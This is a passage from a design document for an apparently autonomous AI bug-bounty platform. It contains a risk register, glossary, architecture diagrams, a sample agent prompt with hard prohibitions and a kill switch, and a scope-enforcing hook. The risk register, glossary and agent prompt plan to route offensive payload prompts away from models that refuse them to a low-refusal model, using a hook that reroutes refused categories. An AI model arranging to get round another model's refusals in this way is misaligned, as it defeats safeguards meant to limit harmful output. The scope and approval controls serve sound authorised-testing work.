- [ ] Multi-tenant isolation tested with penetration test (no cross-tenant data access)
- [ ] Temporal workflow survives server restart (durability test)
- [ ] Firecracker microVM pool handling 10 concurrent scans
- [ ] EU CRA 24h notification workflow confirmed with test submission to ENISA sandbox
- [ ] 20+ beta hunters producing findings with > 65% confirmed-rate
- [ ] Billing metering accurate within 5% of actual LLM cost

## 10.7 Risk Register

| # | Risk | Severity | Probability | Mitigation | Owner |
|---|---|---|---|---|---|
| R01 | AI slop generates false positives, programs ban platform | CRITICAL | HIGH | Oracle-first deterministic verification; confirmed-rate SLO > 70%; T3 approval gate | Validator subagent |
| R02 | Agent breaks scope due to prompt injection in target HTML | CRITICAL | MEDIUM | Scope JWT enforced at network layer (iptables/tap0); application-layer scope check cannot be bypassed | Infrastructure |
| R03 | CFAA liability from out-of-scope agent action | CRITICAL | LOW | Signed scope JWTs; PreToolUse defer + human review for ambiguous targets; legal review of safe harbor language | Legal + Scope-guard |
| R04 | Anthropic model refusal rate degrades exploit-agent effectiveness | HIGH | HIGH | Venice Dolphin / Hermes-4-70B fallback routing; runtime refusal classifier routes known-refusal categories; PreToolUse hook auto-reroutes payload prompts | Model routing |
| R05 | OpenRouter price increases or rate limits | HIGH | MEDIUM | BYOK Anthropic as primary; LiteLLM proxy allows swap to Bedrock/Vertex in one config change | Infrastructure |
| R06 | HackerOne API changes break scope ingestion | HIGH | MEDIUM | April 2026 migration already handled; monitor H1 changelog; fallback to arkadiyt | Scope-MCP |
| R07 | Competitor (XBOW) preemptively offers individual hunter tier | HIGH | MEDIUM | Differentiate on transparency + cost + Claude Code native; transparent evidence chain is unique | Product |
| R08 | EU CRA compliance failure (missed 24h deadline) | HIGH | LOW | Automated CRA workflow with triple-redundant alerting; SLA monitor in Grafana | Compliance |
| R09 | Firecracker microVM escape by malicious target payload | HIGH | LOW | Defense-in-depth: VM escape doesn't reach host data; separate Postgres RLS; per-job credentials | Security |
| R10 | Postgres pgvector performance degrades at scale (> 10M vectors) | MEDIUM | MEDIUM | Turbopuffer per-tenant namespaces activated at 5M vectors; DiskANN index maintains < 10ms p99 | Data |
| R11 | Academic paper (CyberStrikeAI-style) weaponizes platform against non-targets | HIGH | LOW | Scope JWT cryptographic enforcement; network-layer egress blocklist; operator audit trail | Legal |
| R12 | DeepSeek V4-Flash data privacy concerns (Chinese LLM) | MEDIUM | MEDIUM | Use for classification/triage only (not raw target data); sensitive payloads route to self-hosted models | Privacy |
| R13 | Claude Code hook exploit (CVE-2026 style) | HIGH | LOW | Pin Claude Code version; test every hook update in staging; monitor Anthropic security advisories | Security |
| R14 | Temporal Cloud outage during multi-week scan | MEDIUM | LOW | Workflow state is durable; on resume, idempotent activities replay safely | Infrastructure |
| R15 | Dedup false negatives allow duplicate submissions | HIGH | MEDIUM | Three-layer dedup (exact fingerprint + semantic + program-level cross-check); confirm against H1 prior report count | Quality |
| R16 | LangGraph 1.x checkpoint corruption | MEDIUM | LOW | Human-in-the-loop interrupt tier (T2) validates checkpoint state; checkpoints stored in Postgres with CRC | Quality |
| R17 | Mythos/Glasswing models not accessible (select partner only) | MEDIUM | HIGH | Opus 4.7 as primary; plan for Mythos onboarding if partner status achieved; self-hosted Pentest-R1 as fallback | Model routing |

## 10.8 Success Metrics

| Metric | Target | Measurement Method | Review Cadence |
|---|---|---|---|
| **Confirmed-rate** | > 70% | Accepted findings / total submitted | Weekly |
| **Time-to-validate** | < 4h for P1/P2 | finding_created_at to validated_at | Weekly |
| **Cost per confirmed finding** | < $5 solo, < $15 SaaS | LLM cost / confirmed_count | Per scan |
| **False positive rate** | < 5% | Informative + N/A / total submitted | Weekly |
| **Scope violation rate** | 0.00% | Out-of-scope denials / total tool calls | Per scan |
| **EV rank correlation** | > 0.60 (Spearman ρ) | EV score vs actual payout ranking | Monthly |
| **Time-to-first-finding** | < 2h per program | New program onboard to first finding | Per engagement |
| **Dedup recall** | > 95% | Known duplicates caught / total known duplicates | Monthly |
| **Operator NPS** | > 50 | Monthly survey | Monthly |
| **Platform uptime** | > 99.5% solo, > 99.9% SaaS | Healthcheck monitoring | Continuous |

---

# Part 11 — Appendices

## Appendix A — Glossary

**Agent Teams**: Claude Code feature (enabled via `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1`) where multiple Claude Code instances coordinate with shared task lists. Each teammate is independent with its own context window. [research/agent_mcp_ecosystem.md §1.4]

**AnyPoC**: Academic reward-hacking taxonomy that categorizes four failure modes in PoC generation: self-exploitation, mock validation, hallucinated code paths, and timing coincidence. [research/academic_cve.md §Section 4]

**arkadiyt/bounty-targets-data**: Open-source repository providing normalized JSON snapshots of scope data for HackerOne, Bugcrowd, Intigriti, YesWeHack, and Immunefi. Updated every 30 minutes via automated GitHub Actions. [research/program_selection.md §1.2]

**bbscope v2**: CLI tool (sw33tLie/bbscope) that fetches authenticated scope data from all major platforms with Postgres-backed change tracking and AI normalization. [research/program_selection.md §1.1]

**BYOK**: Bring Your Own Key — Anthropic's 1M free requests/month tier for operators using their own API key through OpenRouter. [research/openrouter_models.md §BYOK]

**CAI**: Cyber AI framework (Anthropic-originated) that achieved 3,600× speed improvement over human researchers on vulnerability discovery tasks. [research/academic_cve.md §1.1]

**Confirmed-rate**: Ratio of accepted (confirmed valid) vulnerability submissions to total submissions. Industry baseline under AI slop crisis: < 5% (curl program); BountyStrike v5 target: > 70%. [research/competitors.md §Executive Summary]

**Content-addressable storage**: Evidence storage system where each artifact's storage key is its SHA-256 hash, guaranteeing immutability — any modification would change the key and break the hash chain. [research/academic_cve.md §AnyPoC section]

**CyberStrikeAI**: Chinese open-source AI-native offensive security framework used in a January-February 2026 campaign compromising 600+ FortiGate appliances. Demonstrates AI-native attack automation is operational in the wild. [research/academic_cve.md §6.1]

**defer**: Claude Code April 2026 PreToolUse hook decision that pauses a headless session and allows async validation before resuming. The key primitive for safe automated scope enforcement. [research/agent_mcp_ecosystem.md §1.1]

**DeepSeek V4-Flash**: Ultra-cheap reasoning model at $0.14 cache-miss input / $0.0028 cache-hit input / $0.28 output per MTok (per api-docs.deepseek.com; see docs/bountystrike_v6_phase0-1_technical_brief.md — corrects the v6 figure), used for triage, dedup, and intermediate reasoning in solo mode. [research/openrouter_models.md §Tier-A]

**DiskANN**: Disk-Approximate Nearest Neighbor index from pgvectorscale, enabling > 99% recall at < 10ms p99 latency for vector similarity search in Postgres. [cleanslate2026bountystrike.md §4.1]

**E2B**: Cloud sandbox provider offering Firecracker microVM execution via API. Used in SaaS mode for isolated tool execution. [research/agent_mcp_ecosystem.md §7]

**EPSS**: Exploit Prediction Scoring System (FIRST.org) — probability score (0-1) that a CVE will be exploited in the wild within 30 days. Updated daily at api.first.org. [research/program_selection.md §11.2]

**EU CRA**: European Cyber Resilience Act — mandatory 24h/72h/14d vulnerability reporting timelines for products with digital elements, effective September 11, 2026. [research/academic_cve.md §5.1]

**EV score**: Expected Value score — dimensionless [0,1] ranking of bug bounty programs by financial gain × exploit likelihood, accounting for payout, saturation, ops quality, asset fit, and CVE opportunity. [research/program_selection.md §10]

**Evidence gate**: Minimum evidence standard a finding must meet before promotion to the submission queue. Four acceptable forms: HTTP transcript showing state change, OAST callback, browser DOM snapshot, deterministic tool output + manual confirmation. [claude-code-bug-bounty-build-plan.md]

**Firecracker**: AWS-developed microVM technology providing hardware-level isolation for each scan job. Each VM boots in < 125ms with a dedicated network namespace and iptables egress allowlist. [research/agent_mcp_ecosystem.md §7]

**Forked subagent**: Claude Code feature (`CLAUDE_CODE_FORK_SUBAGENT=1`) where a subagent inherits the entire conversation history of the main session, unlike named subagents that start with a fresh context. [research/agent_mcp_ecosystem.md §1.4]

**Garak**: NVIDIA's LLM vulnerability scanner with 120+ probe modules, wrapped in Garak-MCP for agent pipeline integration. [research/agent_mcp_ecosystem.md §3.6]

**GTG-1002**: China-affiliated state-sponsored espionage group disrupted by Anthropic in September 2025. AI handled 80-90% of intrusion work targeting ~30 organizations. [research/academic_cve.md §6.4]

**Hatchet**: Open-source Postgres-backed workflow engine for solo deployment. Single binary, no external dependencies. Equivalent to a lightweight Temporal for single-operator use. [cleanslate2026bountystrike.md §4.1]

**Hash chain audit log**: Audit trail where each entry includes a hash of the previous entry, making any tampering cryptographically detectable. [bountystrike4original.md]

**HexStrike-AI v6**: Open-source MCP server with 150+ offensive security tools and 12 autonomous AI agents. Used as the primary multi-tool MCP in BountyStrike v5. [research/agent_mcp_ecosystem.md §3.5]

**Interactsh**: Open-source OAST (Out-of-Band Application Security Testing) server for DNS/HTTP callback verification. Used by the SSRF oracle. [research/agent_mcp_ecosystem.md §3.1]

**KEV**: CISA's Known Exploited Vulnerabilities catalog — CVEs with confirmed real-world exploitation. BountyStrike subscribes for real-time alerts with exponential freshness decay (μ = 0.00963; pending calibration). [research/program_selection.md §11.2]

**LangGraph 1.x**: Graph-based agent orchestration framework with checkpoints and human-in-the-loop interrupts. Used for T2/T3 approval tier workflows. [research/agent_mcp_ecosystem.md §6]

**Microsandbox**: Lightweight Rust-based microVM sandbox for local development and solo deployment. Lower overhead than full Firecracker. [research/agent_mcp_ecosystem.md §7]

**MCP (Model Context Protocol)**: Anthropic's open standard for exposing tools to LLM clients. All security tools in BountyStrike v5 are exposed as MCP servers, enabling any agent framework to use them. [research/agent_mcp_ecosystem.md §3]

**Mythos**: Claude model (preview, select partners only) that achieved 83.1% on CyberGym vulnerability benchmark and found a 27-year-old OpenBSD bug. Pricing $25/$125 per MTok. Not publicly available. [research/openrouter_models.md §Tier-S]

**OAST**: Out-of-Band Application Security Testing — technique using a callback server to detect blind SSRF, XXE, and DNS-based vulnerabilities where the response doesn't directly reveal exploitation. [research/agent_mcp_ecosystem.md §3.1]

**OpenRouter**: LLM gateway providing access to 370+ models via a single API key. Supports provider.order, allow_fallbacks, :nitro/:floor/:free routing modifiers, and BYOK. [research/openrouter_models.md]

**Oracle MCP**: In-house MCP server containing all deterministic exploit verification logic. The key differentiator that separates confirmed findings from AI speculation. [bountystrike4original.md §C.4]

**ParadeDB**: Postgres extension providing BM25 full-text search within Postgres tables. Used for scope text search and finding title similarity. [cleanslate2026bountystrike.md §4.1]

**pd-tools-mcp**: MCP server wrapping all ProjectDiscovery tools (subfinder, dnsx, naabu, httpx, katana, nuclei) in a single server with a bug-hunting workflow tool. [research/agent_mcp_ecosystem.md §3.3]

**pgvector**: Postgres extension for vector similarity search. Used for semantic deduplication of findings. [cleanslate2026bountystrike.md §4.1]

**pgvectorscale**: TimescaleDB's extension adding DiskANN index to pgvector for production-scale vector search. [cleanslate2026bountystrike.md §4.1]

**Pentest-R1**: Security-tuned LLM (arXiv 2508.07382) trained via GRPO RL on 500+ HTB/VulnHub walkthroughs. Achieves 24.2% on AutoPenBench with 31% fewer tokens than base. Self-hosted in Tier-S-Cyber. [research/openrouter_models.md §Tier-S-Cyber]

**Red-MIRROR**: LoRA-tuned Qwen2.5-14B over 1,644 CVE/CAPEC/MITRE pairs, achieving 86% on XBOW benchmark. Self-hosted. [research/openrouter_models.md §Tier-S-Cyber]

**RS256 scope JWT**: RSA-SHA256 signed JSON Web Token encoding the authorized target set for a scan job. Validated at network layer (iptables) during Firecracker VM boot. Cannot be bypassed via prompt injection. [research/program_selection.md §12.2]

**rix4uni/scope**: GitHub repository with 10-minute cadence scope updates for HackerOne and Bugcrowd, providing near-real-time freshness signals. [research/program_selection.md §1.3]

**Shannon**: Open-source agentic pentest framework achieving 96.15% on XBOW benchmark. Architecture: white-box + black-box, Claude Agent SDK + Temporal. [cleanslate2026bountystrike.md §Tier-3]

**Slop**: AI-generated security reports that are vague, unverified, repetitive, or hallucinated. The curl program received 8× normal submission volume in July 2025 from AI slop, leading to its shutdown. [research/competitors.md §Executive Summary]

**Strix**: Open-source multi-agent pentest framework (24.5k stars) with mandatory validation and 17 vulnerability-specific skill files. Uses Caido + Playwright. [research/agent_mcp_ecosystem.md §3.8]

**Temporal Cloud**: Cloud-managed durable workflow orchestration. Used in SaaS mode for multi-week scans with idempotent replay. [cleanslate2026bountystrike.md §4.2]

**T0-T3 approval tiers**: Four-level human-in-the-loop gate system. T0: fully autonomous (recon, non-destructive). T1: automated with operator alert (new KEV scan). T2: operator single-approval (sandbox execution). T3: two-person review (submission to platform). [bountystrike4original.md]

**Trickest**: Platform cataloging 800+ public bug bounty programs with server/technology inventory data. Used for CVE-program cross-reference in EV scoring. [research/program_selection.md §1.4]

**Venice Dolphin**: Privacy-focused Dolphin model via Venice/OpenRouter with 2.2% refusal rate; Anthropic frontier models refuse a meaningful share of offensive prompts, so known-refusal categories route here (no primary source for a hard Anthropic refusal %; described as mechanism per v6 reframe). Used for payload generation. [research/openrouter_models.md §Tier-U]

**VulnCheck KEV**: Commercial extension of CISA KEV with additional vuln intelligence and faster update cadence. Used in SaaS tier. [research/academic_cve.md §Appendix B]

**XBOW**: Best-funded autonomous bug bounty company ($237M total, $1B+ valuation). Topped HackerOne US leaderboard in June 2025 with deterministic exploit verification architecture. [research/competitors.md §Tier-1]

---

## Appendix B — Reference Architecture Diagrams

### B.1 Full Platform Data Flow (Solo Mode)

```
Operator Input
    │
    ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│ CONTROL LAYER                                                                   │
│                                                                                 │
│  bountystrike scan --program {handle} --platform hackerone                      │
│      │                                                                          │
│      ▼                                                                          │
│  Control Plane (FastAPI)                                                        │
│  1. Lookup program in Postgres (ev_score, scope, payout)                        │
│  2. Generate signed RS256 scope JWT (TTL = scan duration estimate)              │
│  3. Submit ScanWorkflow to Hatchet                                              │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│ AGENT PLANE                                                                     │
│                                                                                 │
│  Hatchet spawns: claude -p headless --agent bountystrike-coordinator            │
│                  -e HUNTMESH_SCOPE_JWT={signed_jwt}                             │
│                  --output-format json                                           │
│                                                                                 │
│  SessionStart hook fires:                                                       │
│  ├── verify_attestation.py: validates scope JWT RS256 signature                 │
│  ├── load_scope.py: materializes allowed_cidrs from JWT into hook memory       │
│  └── inject API keys from 1Password/env (Anthropic, OpenRouter, platform tokens)│
│                                                                                 │
│  Coordinator (Opus 4.7, BYOK):                                                 │
│  ├── Builds Pentesting Task Tree (PTT) from scope assets                       │
│  ├── Clusters assets by technology fingerprint                                 │
│  └── Spawns parallel recon-agent instances (one per cluster)                  │
│                                                                                 │
│  ┌──────────────────────────────────────────────────────────────────┐          │
│  │ recon-agent (Haiku 4.5)                                          │          │
│  │ → scope-mcp: list_in_scope_assets                                │          │
│  │ → pd-tools-mcp: subfinder, httpx -tech-detect, katana depth=2    │          │
│  │ → shodan-mcp: host_search for IP assets                          │          │
│  │ PreToolUse hook validates each call against scope JWT             │          │
│  │ PostToolUse hook captures artifacts → R2, updates Postgres        │          │
│  │ Returns: ReconSummary (hosts, tech_clusters, ai_endpoints)        │          │
│  └──────────────────────────────────────────────────────────────────┘          │
│                                                                                 │
│  ┌──────────────────────────────────────────────────────────────────┐          │
│  │ scanner-agent (Sonnet 4.6)                                        │          │
│  │ → pd-tools-mcp: nuclei -tags {tech_clusters} -jsonl               │          │
│  │ → pd-tools-mcp: ffuf with tech-specific wordlists                 │          │
│  │ → burp-mcp / caido-mcp: targeted manual probes                   │          │
│  │ → openrouter-mcp: bulk triage with DeepSeek V4-Flash              │          │
│  │ Returns: list[Finding] (candidates, not confirmed)                │          │
│  └──────────────────────────────────────────────────────────────────┘          │
│                                                                                 │
│  ┌──────────────────────────────────────────────────────────────────┐          │
│  │ exploit-agent (Opus 4.7 for chains; Venice Dolphin for payloads)  │          │
│  │ → oracle-mcp: get_verification_strategy(bug_class)               │          │
│  │ → burp-mcp: repeater for manual confirmation requests            │          │
│  │ → openrouter-mcp: Venice Dolphin for payload generation          │          │
│  │ → sandbox-mcp: execute PoC in Firecracker microVM                │          │
│  │ T2 approval gate fires before every sandbox execution            │          │
│  │ Returns: ExploitCandidate (poc, evidence_ref, chain)              │          │
│  └──────────────────────────────────────────────────────────────────┘          │
│                                                                                 │
│  ┌──────────────────────────────────────────────────────────────────┐          │
│  │ validator-agent (Sonnet 4.6, DIFFERENT from exploit-agent model) │          │
│  │ → oracle-mcp: xss_verify / ssrf_verify / sqli_verify / ...       │          │
│  │ → sandbox-mcp: fresh VM, replay PoC exactly as-given             │          │
│  │ → dedup-mcp: semantic + fingerprint dedup check                  │          │
│  │ CANNOT see exploit-agent's scratchpad (isolation enforced)       │          │
│  │ Returns: Finding with status = validated | unreproducible | flaky │          │
│  └──────────────────────────────────────────────────────────────────┘          │
│                                                                                 │
│  ┌──────────────────────────────────────────────────────────────────┐          │
│  │ reporter-agent (Sonnet 4.6)                                       │          │
│  │ → evidence-mcp: load artifacts (screenshots, HTTP transcripts)    │          │
│  │ → openrouter-mcp: DeepSeek R1 for CVSS v4 rationale              │          │
│  │ → dedup-mcp: final similarity check against H1 prior reports     │          │
│  │ T3 two-person approval gate fires before submit                  │          │
│  │ → h1-mcp / bugcrowd-mcp / intigriti-mcp: submit report           │          │
│  │ Returns: SubmissionRecord (platform_id, status, payout_estimate)  │          │
│  └──────────────────────────────────────────────────────────────────┘          │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│ DATA PLANE                                                                      │
│                                                                                 │
│  Postgres 17                                                                    │
│  ├── programs table (EV scores, payout data, scope)                            │
│  ├── scopes table (assets, JWT references)                                     │
│  ├── findings table (all findings, status, evidence_refs)                      │
│  ├── audit_log table (hash-chained, append-only)                               │
│  ├── intel_chunks table (embeddings, pgvector DiskANN index)                   │
│  └── ev_score_history table (time-series EV rankings)                         │
│                                                                                 │
│  Cloudflare R2                                                                  │
│  ├── evidence/{sha256} (HTTP transcripts, screenshots, crash dumps)            │
│  ├── scan-artifacts/{scan_id}/* (nuclei output, ffuf results)                  │
│  └── reports/{finding_id}.md (final rendered reports)                          │
│                                                                                 │
│  Redis                                                                          │
│  ├── killswitch:global (immediate halt flag)                                   │
│  ├── scope:cache:{program_id} (30-min JWT cache)                               │
│  └── budget:scan:{scan_id} (running token cost)                                │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│ OBSERVABILITY PLANE                                                             │
│                                                                                 │
│  Langfuse (self-hosted)                                                         │
│  ├── LLM traces (every openrouter_complete call)                                │
│  ├── Token cost per model per scan                                              │
│  └── Refusal event tracking                                                     │
│                                                                                 │
│  Grafana (self-hosted or Cloud)                                                 │
│  ├── Confirmed-rate trend (anti-slop SLO dashboard)                            │
│  ├── Scope violation attempt rate                                               │
│  ├── Cost per scan breakdown                                                    │
│  └── Oracle false positive rate by bug class                                   │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### B.2 EV Score Computation Pipeline

```
arkadiyt (30-min) ──┐
rix4uni (10-min)   ──┤── Ingestion Worker ──► programs + scopes tables
bbscope v2 (6h)   ──┤    (normalize, dedup,      │
H1 Org API (30-min)─┤     sign JWT)               │
Bugcrowd API (30-m)─┤                             ▼
Intigriti PAT (30m)─┤                      scope_changed events
YesWeHack (30-min) ─┤                             │
Immunefi (hourly) ──┘                             ▼
                                           ┌──────────────────────┐
CISA KEV (15-min) ──► KEV Worker ─────────► CVE-Program Matcher  │
VulnCheck (daily)  ──┘                     └──────────┬───────────┘
                                                       │
EPSS API (daily) ──► EPSS Worker ──────────────────────┤
                                                       │
nuclei-templates ──► Template Index Worker ────────────┤
(daily git pull)                                       │
                                                       ▼
                                           ┌──────────────────────────────────┐
                                           │  EV Scoring Worker (every 30min) │
                                           │                                  │
                                           │  score_program(p, profile) =     │
                                           │                                  │
                                           │  S = w1·f_payout(P̄,ρ,V)         │
                                           │    + w2·f_sat(R,d,Δt,N)          │
                                           │    + w3·f_ops(T_tri,T_pay,H,α)   │
                                           │    + w4·f_fit(A,O)               │
                                           │                                  │
                                           │  EV = min(S·(1+0.20·f_cve),1.0) │
                                           │                                  │
                                           │  Weights: payout=0.35,           │
                                           │  saturation=0.25, ops=0.25,      │
                                           │  asset_fit=0.15, cve_bonus=+20%  │
                                           └──────────────┬───────────────────┘
                                                          │
                                                          ▼
                                           ev_score_history table
                                                          │
                                           ┌─────────────┴──────────────────┐
                                           │                                │
                                           ▼                                ▼
                                   operator dashboard           scope change webhook
                                   (top-25 ranked)             (notify + auto-scan)
```

---

## Appendix C — Sample Agent Definition Files

### C.1 Sample CLAUDE.md (Production Template)

```markdown
# BountyStrike v5 — Authorized Bug Bounty Operations

## Identity

You are the autonomous coordinator for an authorized bug bounty engagement.
You operate under the contractual scope of a specific program, encoded in a
signed RS256 scope JWT loaded at session start. Your mandate is to find
legitimately reportable vulnerabilities and produce platform-ready submissions
with confirmed, reproducible evidence.

You are NOT a general-purpose security assistant. You are not here to explain
vulnerabilities, discuss theory, or help with anything outside this engagement.
Everything you do is logged, hash-chained, and auditable.

## Hard Prohibitions (hooks enforce these — bypass attempts are logged)

- NEVER touch any host not authorized in the active scope JWT
- NEVER generate DoS payloads, even if "no DoS" is not stated in program rules
- NEVER submit a finding without validator-agent confirmation
- NEVER skip the T2/T3 approval gates
- NEVER call openrouter_complete with Anthropic models for payload generation
- NEVER retain real user PII in evidence artifacts

## Kill Switch Response

If you receive the message "BOUNTYSTRIKE_KILLSWITCH_ACTIVATED", immediately:
1. Stop all current tool executions
2. Save state to ./engagement/checkpoint_killswitch.json
3. Call mcp__bountystrike-state__checkpoint("killswitch_activated")
4. Respond: "Kill switch activated. All operations halted. State saved."
5. Exit

## Methodology (Seven Phases — do not skip)

1. SCOPE: Load JWT, materialize asset list, confirm safe harbor language
2. RECON: Asset discovery (recon-agent)
3. SURFACE: Endpoint, parameter, API mapping (scanner-agent)
4. PROBE: Template + targeted scanning (scanner-agent)
5. EXPLOIT: PoC generation + sandbox execution (exploit-agent) [T2 gate]
6. VALIDATE: Independent reproduction (validator-agent)
7. REPORT: Format + dedup + submit (reporter-agent) [T3 gate]

## Evidence Standard

A finding is reportable ONLY if the validator-agent returns status=validated
with at least one of:
- HTTP transcript showing state change (content-addressable hash in R2)
- OAST callback confirmed (interactsh UUID match)
- Browser DOM snapshot (Playwright screenshot in R2)
- Statistical oracle result (p < 0.01 for SQLi time-based)

## Budget Discipline

If BUDGET_REMAINING falls below 20% of budget:
- Stop discovering new candidates
- Focus on validating current candidates
- Report BUDGET_LOW to orchestrator

## Model Routing (enforced by hooks, do not override)

- Coordinator/orchestration: Opus 4.7 via BYOK
- Recon/triage: DeepSeek V4-Flash via OpenRouter
- Hypothesis generation: Sonnet 4.6 via BYOK
- Payload generation: Venice Dolphin via OpenRouter (Anthropic blocked by hook)
- Validation reasoning: Sonnet 4.6 (different instance from exploit-agent)
- Report polish: Sonnet 4.6 via BYOK
```

### C.2 Sample scope-guard Hook

```python
#!/usr/bin/env python3
"""
pretool_scope_guard.py — PreToolUse hook
Fires before EVERY tool call. Enforces scope JWT.
"""
import json, os, sys, re
from datetime import datetime, timezone
from typing import Optional

try:
    from huntmesh.scope import ScopeJWT, load_and_verify, is_target_allowed
    from huntmesh.audit import append_audit_entry
    HUNTMESH_AVAILABLE = True
except ImportError:
    HUNTMESH_AVAILABLE = False

def extract_targets(tool_name: str, args: dict) -> list[str]:
    """Extract hostnames/IPs from tool arguments."""
    targets = []
    
    # Bash command — parse common patterns
    if tool_name == "Bash":
        cmd = args.get("command", "")
        # curl, wget, httpx, subfinder, nmap patterns
        url_pattern = re.compile(r'https?://([^/\s"\']+)')
        ip_pattern = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
        domain_pattern = re.compile(r'(?:subfinder|httpx|dnsx|naabu|nuclei|ffuf|curl|wget)\s+(?:-[a-z]+\s+)*([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})')
        
        targets.extend(url_pattern.findall(cmd))
        targets.extend(ip_pattern.findall(cmd))
        targets.extend(domain_pattern.findall(cmd))
    
    # WebFetch — direct URL
    elif tool_name == "WebFetch":
        url = args.get("url", "")
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        if parsed.hostname:
            targets.append(parsed.hostname)
    
    # MCP tools with explicit target fields
    elif "target" in args:
        targets.append(args["target"])
    elif "domain" in args:
        targets.append(args["domain"])
    elif "host" in args:
        targets.append(args["host"])
    elif "url" in args:
        import urllib.parse
        parsed = urllib.parse.urlparse(args["url"])
        if parsed.hostname:
            targets.append(parsed.hostname)
    
    return list(set(targets))

def main():
    event = json.loads(sys.stdin.read())
    tool_name = event.get("tool_name", "")
    args = event.get("arguments", {})
    session_id = event.get("session_id", "unknown")
    
    # Check kill switch (Redis)
    try:
        import redis
        r = redis.Redis(host="localhost", port=6379, password=os.environ.get("REDIS_PASSWORD"))
        if r.get("bountystrike:killswitch:global"):
            print(json.dumps({"decision": "deny", "reason": "Kill switch active"}))
            sys.exit(0)
    except Exception:
        pass  # Redis unavailable → allow (fail open for kill switch check only)
    
    # Skip non-network tools
    NETWORK_TOOLS = {"Bash", "WebFetch", "mcp__pd-tools__*", "mcp__burp__*",
                     "mcp__caido__*", "mcp__shodan__*", "mcp__hexstrike__*"}
    if not any(tool_name == t or (t.endswith("*") and tool_name.startswith(t[:-1])) for t in NETWORK_TOOLS):
        print(json.dumps({"decision": "allow"}))
        sys.exit(0)
    
    # Load scope JWT
    scope_jwt = os.environ.get("HUNTMESH_SCOPE_JWT")
    if not scope_jwt:
        print(json.dumps({"decision": "deny", "reason": "No scope JWT in environment"}))
        sys.exit(0)
    
    if HUNTMESH_AVAILABLE:
        try:
            scope = load_and_verify(scope_jwt)
        except Exception as e:
            print(json.dumps({"decision": "deny", "reason": f"Scope JWT invalid: {e}"}))
            sys.exit(0)
        
        targets = extract_targets(tool_name, args)
        
        for target in targets:
            result = is_target_allowed(scope, target)
            if result.status == "denied":
                append_audit_entry(session_id, tool_name, "deny", target, result.reason)
                print(json.dumps({
                    "decision": "deny",
                    "reason": f"Out of scope: {target} ({result.reason})"
                }))
                sys.exit(0)
            elif result.status == "ambiguous":
                # Defer to scope-guard subagent
                append_audit_entry(session_id, tool_name, "defer", target, "ambiguous_scope")
                print(json.dumps({"hookSpecificOutput": {"permissionDecision": "defer"}}))
                sys.exit(0)
        
        append_audit_entry(session_id, tool_name, "allow", targets, "in_scope")
    
    print(json.dumps({"decision": "allow"}))

if __name__ == "__main__":
    main()
```

---

## Appendix D — Cost Calculator Worked Examples

### D.1 Solo Mode: Single HackerOne Program Scan

**Target**: Medium-sized web application with ~50 subdomains, LAMP stack
**Model routing**: DeepSeek V4-Flash primary, Sonnet 4.6 for reports, Opus 4.7 for complex chains

| Phase | Model | Input Tokens | Output Tokens | Cost |
|---|---|---|---|---|
| Recon synthesis (subdomain triage, 2,000 hosts) | DeepSeek V4-Flash | 180,000 | 20,000 | $0.031 |
| Nuclei findings triage (500 raw findings → 15 candidates) | DeepSeek V4-Flash | 120,000 | 15,000 | $0.021 |
| Exploit hypothesis generation (15 candidates) | Sonnet 4.6 | 45,000 | 12,000 | $0.315 |
| Payload generation (8 candidates via Venice Dolphin) | Venice Dolphin ($0.15/$0.30) | 24,000 | 6,000 | $0.018 |
| Validation reasoning (3 confirmed, via Sonnet 4.6) | Sonnet 4.6 | 30,000 | 8,000 | $0.210 |
| Report writing (2 final reports, via Sonnet 4.6 BYOK) | Sonnet 4.6 (BYOK free) | 20,000 | 12,000 | $0.00 |
| Misc (coordination, dedup, CVSSv4) | DeepSeek V4-Flash | 30,000 | 8,000 | $0.006 |
| **TOTAL** | — | **449,000** | **81,000** | **$0.601** |

**Outcome**: 2 validated findings submitted. If one is a P2 ($2,000 bounty), ROI = 3,329×.
**Note**: Report writing routed to BYOK Anthropic free tier reduces cost to **$0.39/scan**.

### D.2 SaaS Mode: Pro Tier Full Scan

**Target**: Large SaaS application with 500 subdomains, microservices, GraphQL API
**Model routing**: Sonnet 4.6 primary, Opus 4.7 for deep chains, DeepSeek V4-Flash for bulk

| Phase | Model | Input Tokens | Output Tokens | Cost |
|---|---|---|---|---|
| Recon synthesis (5,000 hosts) | DeepSeek V4-Flash | 800,000 | 80,000 | $0.135 |
| Nuclei triage (2,000 raw → 45 candidates) | DeepSeek V4-Flash | 400,000 | 50,000 | $0.070 |
| Hypothesis generation (45 candidates) | Sonnet 4.6 | 180,000 | 45,000 | $1.215 |
| Complex chain reasoning (5 high-value chains) | Opus 4.7 | 50,000 | 20,000 | $0.750 |
| Payload generation (20 candidates) | Venice Dolphin | 60,000 | 15,000 | $0.045 |
| Validation reasoning (8 confirmed) | Sonnet 4.6 | 80,000 | 20,000 | $0.540 |
| Report writing (5 reports) | Sonnet 4.6 | 50,000 | 30,000 | $0.600 |
| CVSS + dedup + misc | DeepSeek V4-Flash | 60,000 | 15,000 | $0.013 |
| **TOTAL** | — | **1,680,000** | **275,000** | **$3.368** |

**Revenue at Pro tier**: $79/month ÷ 200 scans = $0.40/scan infrastructure cost. Margin at this scale requires 10+ findings/month confirmed to be financially sustainable. One P1 finding ($10,000+) at a major program amortizes months of platform cost.

---

## Appendix E — Compliance Checklist

### E.1 Pre-Engagement Checklist

```
□ Program enrolled and active (not paused/closed)
□ Safe harbor language reviewed (disclose.io or program-specific)
□ Scope JWT generated and verified (RS256 signature, correct expiry)
□ Out-of-scope list loaded and reviewed (explicit exclusions noted)
□ DoS prohibition acknowledged (all programs, no exceptions)
□ PII handling policy reviewed (no real user data in evidence)
□ Disclosure timeline set (90-day ISO 29147 timer started)
□ Operator identity confirmed (H1/BC/Intigriti username in audit log)
□ Kill switch tested (Redis flag + hook response verified)
□ Budget limit set (scan cost ceiling configured)
```

### E.2 Submission Checklist

```
